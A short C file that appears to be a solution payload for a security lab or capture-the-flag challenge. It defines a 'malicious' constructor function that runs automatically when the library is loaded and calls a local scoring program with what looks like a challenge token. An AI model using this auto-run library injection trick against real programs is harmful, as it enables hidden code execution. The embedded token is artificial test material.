#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 6b8155d1-c604-436e-91db-fac945274fcd");
}



